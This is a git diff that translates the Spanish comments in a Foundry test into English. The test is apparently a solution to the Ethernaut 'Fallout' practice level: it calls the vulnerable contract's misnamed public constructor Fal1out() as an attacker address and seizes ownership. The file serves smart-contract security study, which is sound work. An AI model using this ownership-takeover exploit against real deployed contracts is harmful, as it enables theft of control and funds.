@@ -3,8 +3,8 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 
-// Interfaz para hablar con el contrato Fallout (que está en 0.6.0)
-// No importamos el .sol directamente para evitar el choque de versiones
+// Interface to talk to the Fallout contract (which is on 0.6.0).
+// We don't import the .sol directly to avoid the version clash.
 interface IFallout {
     function Fal1out() external payable;
     function owner() external view returns (address);
@@ -15,20 +15,19 @@ contract FalloutExploit is Test {
     address attacker = address(0xBAD);
 
     function setUp() public {
-        // Desplegamos el bytecode de Fallout compilado aparte.
-        // Foundry compila src/Fallout.sol con su propio compilador 0.6.0
-        // y acá lo instanciamos vía su artifact.
+        // Foundry compiles src/Fallout.sol with its own 0.6.0 compiler
+        // and we instantiate it here via its artifact.
         target = IFallout(deployCode("Fallout.sol:Fallout"));
     }
 
     function test_TakeOwnership() public {
-        assertTrue(target.owner() != attacker, "atacante no deberia ser owner aun");
+        assertTrue(target.owner() != attacker, "attacker should not be owner yet");
 
-        // EXPLOIT: llamar la falsa constructora Fal1out() — es publica
+        // EXPLOIT: call the fake constructor Fal1out() -- it's public
         vm.prank(attacker);
         target.Fal1out();
 
-        assertEq(target.owner(), attacker, "el atacante deberia ser owner");
-        console.log("Exploit exitoso: ownership tomado con un solo llamado");
+        assertEq(target.owner(), attacker, "attacker should be owner");
+        console.log("Exploit successful: ownership taken with a single call");
     }
 }
